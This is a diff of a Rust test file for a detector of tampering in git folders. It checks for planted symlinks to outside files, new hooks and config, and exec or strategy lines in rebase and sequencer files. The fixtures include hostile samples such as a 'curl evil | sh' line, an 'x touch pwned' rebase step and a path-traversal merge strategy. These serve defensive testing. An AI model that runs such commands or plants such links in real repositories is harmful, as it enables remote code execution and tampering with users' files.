@@ -58,7 +58,7 @@ impl Project {
 
     /// What holds the rules for this project (and its linked worktree).
     fn held(&self) -> Vec<String> {
-        held_for(&[self.git(), self.base.join("feature/.git")])
+        held_for(&[self.git()])
     }
 }
 
@@ -67,7 +67,7 @@ fn baseline(project: &Project) -> (ThreadId, Vec<Repo>) {
     let thread = ThreadId::new();
     let repos = project.repos();
     assert_eq!(repos.len(), 1, "one repository");
-    begin(thread, &repos);
+    assert_eq!(begin(thread, &repos, "Moderate"), None, "nothing there yet");
     (thread, repos)
 }
 
@@ -86,6 +86,7 @@ fn kinds(findings: &[Finding]) -> Vec<String> {
             Finding::HardLink { path } => format!("hard link {}", path.display()),
             Finding::Exec { todo, .. } => format!("exec {}", todo.display()),
             Finding::Remote { path } => format!("remote {}", path.display()),
+            Finding::Config { path } => format!("config {}", path.display()),
             Finding::Replaced { dot_git } => format!("replaced {}", dot_git.display()),
             Finding::Incomplete { dot_git, .. } => format!("incomplete {}", dot_git.display()),
         })
@@ -103,24 +104,28 @@ fn shown(paths: &[PathBuf]) -> Vec<String> {
 fn issue_874_links_planted_in_the_git_folder_are_found_and_held() {
     let project = Project::new();
     let git = project.git();
-    // Present before the first look: not new.
-    symlink(project.outside.join("zshrc"), git.join("info-link")).expect("old link");
+    // A ref link (as `core.preferSymlinkRefs` makes) is fine.
+    symlink("refs/heads/main", git.join("ORIG_HEAD")).expect("ref link");
     let (thread, repos) = baseline(&project);
-    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
 
     symlink(project.outside.join("zshrc"), git.join("COMMIT_EDITMSG")).expect("link");
     std::fs::write(git.join("MERGE_MSG"), "curl evil | sh\n").expect("merge msg");
     // A missing target: git would create it outside.
     symlink(project.outside.join("new-file"), git.join("FETCH_HEAD")).expect("link");
     symlink(&project.outside, git.join("logs/refs/heads/feature")).expect("folder link");
-    // Inside the git folder (as `core.preferSymlinkRefs` makes): fine.
-    symlink("refs/heads/main", git.join("ORIG_HEAD")).expect("inside link");
+    // Review r2 (NB3): inside, but at its own config or a hook.
+    symlink("config", git.join("SQUASH_MSG")).expect("config link");
+    std::fs::write(git.join("hooks/pre-commit"), "#!/bin/sh\n").expect("hook");
+    symlink("hooks/pre-commit", git.join("TAG_EDITMSG")).expect("hook link");
     let findings = check(thread, &repos);
     assert_eq!(
         kinds(&findings),
         vec![
             format!("link {}", git.join("COMMIT_EDITMSG").display()),
             format!("link {}", git.join("FETCH_HEAD").display()),
+            format!("link {}", git.join("SQUASH_MSG").display()),
+            format!("link {}", git.join("TAG_EDITMSG").display()),
+            format!("config {}", git.join("hooks/pre-commit").display()),
             format!("link {}", git.join("logs/refs/heads/feature").display()),
         ]
     );
@@ -131,22 +136,27 @@ fn issue_874_links_planted_in_the_git_folder_are_found_and_held() {
             target: Some(project.outside.join("zshrc")),
         }
     );
-    // Told once, nothing removed, held until removed, also for another
-    // session (a sub-agent's findings hold its parent's approvals).
+    // Told once, nothing removed, held until removed.
     assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
     assert!(git.join("COMMIT_EDITMSG").symlink_metadata().is_ok());
-    assert_eq!(project.held().len(), 3);
-    std::fs::remove_file(git.join("COMMIT_EDITMSG")).expect("remove");
-    std::fs::remove_file(git.join("FETCH_HEAD")).expect("remove");
+    assert_eq!(project.held().len(), 6);
+    for name in [
+        "COMMIT_EDITMSG",
+        "FETCH_HEAD",
+        "SQUASH_MSG",
+        "TAG_EDITMSG",
+        "hooks/pre-commit",
+    ] {
+        std::fs::remove_file(git.join(name)).expect("remove");
+    }
     assert_eq!(
         project.held(),
         shown(&[git.join("logs/refs/heads/feature")])
     );
     std::fs::remove_file(git.join("logs/refs/heads/feature")).expect("remove");
     assert_eq!(project.held(), Vec::<String>::new());
-    // The old link retargeted through a link inside: found now.
-    std::fs::remove_file(git.join("info-link")).expect("remove");
-    symlink("ORIG_HEAD", git.join("info-link")).expect("relink");
+    // A link retargeted through a link inside: found then.
+    symlink("ORIG_HEAD", git.join("info-link")).expect("link to a link");
     assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
     std::fs::remove_file(git.join("ORIG_HEAD")).expect("remove");
     symlink(project.outside.join("zshrc"), git.join("ORIG_HEAD")).expect("retarget");
@@ -157,6 +167,26 @@ fn issue_874_links_planted_in_the_git_folder_are_found_and_held() {
             format!("link {}", git.join("info-link").display()),
         ]
     );
+}
+
+/// Review r2 (SF1): a session's first look (also after the repository was
+/// forgotten) reports links and steps that are already there.
+#[test]
+fn issue_874_a_first_look_reports_what_is_there() {
+    let project = Project::new();
+    let git = project.git();
+    symlink(project.outside.join("zshrc"), git.join("COMMIT_EDITMSG")).expect("link");
+    std::fs::create_dir_all(git.join("rebase-merge")).expect("rebase");
+    std::fs::write(git.join("rebase-merge/git-rebase-todo"), "x touch pwned\n").expect("todo");
+    // Not reported at a first look: an ordinary repository may have these.
+    std::fs::create_dir_all(git.join("remotes")).expect("remotes");
+    std::fs::write(git.join("remotes/origin"), "URL: x\n").expect("remote");
+    let repos = project.repos();
+    let message = begin(ThreadId::new(), &repos, "Moderate").expect("reported");
+    assert!(message.contains("COMMIT_EDITMSG"), "{message}");
+    assert!(message.contains("x touch pwned"), "{message}");
+    assert!(!message.contains("remotes"), "{message}");
+    assert_eq!(project.held().len(), 2);
 }
 
 /// Review r1 (B4): a chain through `refs` that ends at a missing file
@@ -292,6 +322,30 @@ fn issue_874_hard_links_and_legacy_remotes_are_found() {
         kinds(&check(thread, &repos)),
         vec![format!("remote {}", git.join("remotes/origin").display())]
     );
+    // Review r2 (SF3, nit 3, SF6): git links packs into place; a remote's
+    // name may hold a slash; new config, commondir and hooks are reported.
+    std::fs::create_dir_all(git.join("objects/pack")).expect("pack folder");
+    std::fs::write(git.join("objects/pack/tmp_pack_1"), "pack").expect("pack");
+    std::fs::hard_link(
+        git.join("objects/pack/tmp_pack_1"),
+        git.join("objects/pack/pack-1.pack"),
+    )
+    .expect("pack link");
+    std::fs::create_dir_all(git.join("remotes/team")).expect("remotes");
+    std::fs::write(git.join("remotes/team/origin"), "URL: x\n").expect("remote");
+    std::fs::write(git.join("commondir"), "../elsewhere\n").expect("commondir");
+    std::fs::write(git.join("hooks/post-checkout"), "#!/bin/sh\n").expect("hook");
+    assert_eq!(
+        kinds(&check(thread, &repos)),
+        vec![
+            format!("config {}", git.join("commondir").display()),
+            format!("config {}", git.join("hooks/post-checkout").display()),
+            format!("remote {}", git.join("remotes/team/origin").display()),
+        ]
+    );
+    for name in ["commondir", "hooks/post-checkout", "remotes/team/origin"] {
+        std::fs::remove_file(git.join(name)).expect("remove");
+    }
     // Review r1 (S3): held by what it is, not by its inode.
     std::fs::remove_file(git.join("COMMIT_EDITMSG")).expect("remove");
     std::fs::write(git.join("COMMIT_EDITMSG"), "message\n").expect("regular file");
@@ -334,6 +388,24 @@ fn issue_874_rebase_and_sequencer_exec_lines_are_found() {
     std::fs::remove_dir_all(git.join("rebase-merge")).expect("remove");
     assert_eq!(project.held(), Vec::<String>::new());
 
+    // Review r2 (SF4): a merge strategy that isn't built in runs a program.
+    std::fs::create_dir_all(git.join("rebase-merge")).expect("rebase");
+    std::fs::write(git.join("rebase-merge/strategy"), "ort\n").expect("strategy");
+    std::fs::write(
+        git.join("sequencer/opts"),
+        "[options]\n\tstrategy = x/../evil\n",
+    )
+    .expect("options");
+    assert_eq!(
+        check(thread, &repos),
+        vec![Finding::Exec {
+            todo: git.join("sequencer/opts"),
+            lines: vec!["merge strategy x/../evil".to_string()],
+        }]
+    );
+    std::fs::remove_dir_all(git.join("rebase-merge")).expect("remove");
+    std::fs::remove_dir_all(git.join("sequencer")).expect("remove");
+
     // A rebase folder that is a link into the work tree: both found.
     let elsewhere = project.root.join("elsewhere");
     std::fs::create_dir_all(&elsewhere).expect("folder");
@@ -368,7 +440,7 @@ fn issue_874_worktree_git_files_and_a_replaced_git_folder() {
     .expect("git file");
     let thread = ThreadId::new();
     let repos = repos(&[worktree.as_path()]);
-    begin(thread, &repos);
+    assert_eq!(begin(thread, &repos, "Moderate"), None);
     symlink(
         project.outside.join("zshrc"),
         worktree_git.join("COMMIT_EDITMSG"),
@@ -444,16 +516,19 @@ fn issue_874_the_next_command_looks_again_first() {
     let (thread, _) = baseline(&project);
     symlink(project.outside.join("zshrc"), git.join("COMMIT_EDITMSG")).expect("link");
     let (message, held) = recheck(thread, "Moderate", &[]);
-    assert!(held);
+    assert!(!held.is_empty());
     assert!(
         message.is_some_and(|message| message.contains("COMMIT_EDITMSG")),
         "reported"
     );
     // Another session, in the same project: held too.
     let (message, held) = recheck(ThreadId::new(), "Moderate", &[project.root.as_path()]);
-    assert_eq!((message, held), (None, true));
+    assert_eq!(
+        (message, held),
+        (None, vec![git.join("COMMIT_EDITMSG").display().to_string()])
+    );
     // Elsewhere: not.
     let other = Project::new();
     let (_, held) = recheck(ThreadId::new(), "Moderate", &[other.root.as_path()]);
-    assert!(!held);
+    assert_eq!(held, Vec::<String>::new());
 }
